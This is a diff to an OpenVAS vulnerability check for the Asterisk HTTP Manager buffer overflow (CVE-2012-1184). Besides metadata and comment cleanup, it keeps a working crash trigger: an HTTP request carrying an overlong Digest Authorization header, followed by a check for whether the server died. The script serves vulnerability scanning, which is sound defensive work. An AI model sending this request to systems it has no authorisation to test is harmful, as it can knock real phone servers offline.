@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_asterisk_http_manager_bof_vuln.nasl 6697 2017-07-12 11:40:05Z cfischer $
+# $Id: gb_asterisk_http_manager_bof_vuln.nasl 11322 2018-09-11 10:15:07Z asteins $
 #
 # Asterisk HTTP Manager Buffer Overflow Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802838");
-  script_version("$Revision: 6697 $");
+  script_version("$Revision: 11322 $");
   script_cve_id("CVE-2012-1184");
   script_bugtraq_id(52815);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 13:40:05 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:15:07 +0200 (Tue, 11 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-04-23 16:56:33 +0530 (Mon, 23 Apr 2012)");
   script_name("Asterisk HTTP Manager Buffer Overflow Vulnerability");
 
@@ -53,7 +53,7 @@ if(description)
   (main/utils.c) in HTTP Manager, which fails to handle
   'HTTP Digest Authentication' information sent via a crafted request with
   an overly long string.");
-  script_tag(name:"solution", value: "Upgrade to Asterisk 1.8.10.1, 10.2.1 or later,
+  script_tag(name:"solution", value:"Upgrade to Asterisk 1.8.10.1, 10.2.1 or later,
   For updates refer to http://downloads.asterisk.org/pub/security/AST-2012-003.html");
   script_tag(name:"summary", value:"This host is running Asterisk and is prone to buffer overflow
   vulnerability.");
@@ -71,27 +71,17 @@ if(description)
 
 
 include("http_func.inc");
-include("http_keepalive.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-host = "";
-asterPort = 0;
-asterBanner = "";
 
 ## Asterisk HTTP port
 asterPort = get_http_port(default:8080);
 
-## Get Host name
 host = http_host_name(port:asterPort);
 
-## Confirm the application before trying exploit
 asterBanner = get_http_banner(port: asterPort);
 
 if(asterBanner && "Server: Asterisk" >< asterBanner)
 {
-  ##Construct a crafted request
   req = string("GET /amxml HTTP/1.1\r\n",
                "Host: ", host, ":", asterPort, "\r\n",
                "Authorization: Digest ", crap(data: "a", length: 700), "\r\n\r\n");
@@ -99,7 +89,6 @@ if(asterBanner && "Server: Asterisk" >< asterBanner)
   ## Send crafted request
   res = http_send_recv(port:asterPort, data:req);
 
-  ## Confirm Asterisk HTTP Manager is dead
   if(http_is_dead(port:asterPort)){
     security_message(port:asterPort);
     exit(0);
